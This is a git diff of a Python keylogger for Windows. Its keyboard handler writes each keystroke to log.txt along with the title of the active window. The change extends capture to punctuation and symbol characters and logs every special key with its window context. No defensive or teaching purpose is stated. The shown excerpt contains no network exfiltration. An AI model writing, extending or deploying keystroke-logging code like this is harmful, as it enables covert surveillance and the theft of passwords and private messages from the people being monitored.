@@ -4,21 +4,20 @@ import win32gui
 numbers = [str(i) for i in range(10)]
 small_letters = [chr(i) for i in range(ord('a'), ord('z') + 1)]
 capital_letters = [chr(i) for i in range(ord('A'), ord('Z') + 1)]
-
-complete_alphabet = numbers + small_letters + capital_letters
+caracter = ['!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '[', ']', '{', '}', '\\', '|', ';', ':', "'", '"', ',', '.', '/', '?']
+complete_alphabet = numbers + small_letters + capital_letters + caracter
 alphabet = []
 
 for letter in complete_alphabet:
     letter = letter.replace("'", "")
     alphabet.append(letter)
 
-
 def on_press(key):
     hwnd = win32gui.GetForegroundWindow()
     win_title = win32gui.GetWindowText(hwnd)
 
     key = str(key).replace("'", "")
-
+    print(key)
     if key in alphabet:
         with open('log.txt', 'a') as f:
             f.write(key)
@@ -30,11 +29,11 @@ def on_press(key):
     elif key == "Key.space":
         with open('log.txt', 'a') as f:
             f.write(" ")
-    elif key == "Key.enter":
+    elif key == "Key.caps_lock":
+        pass
+    else:
         with open('log.txt', 'a') as f:
             f.write("\n" + key + "     " + win_title + "\n\n")
-    else:
-        pass
 
 
 if __name__ == '__main__':
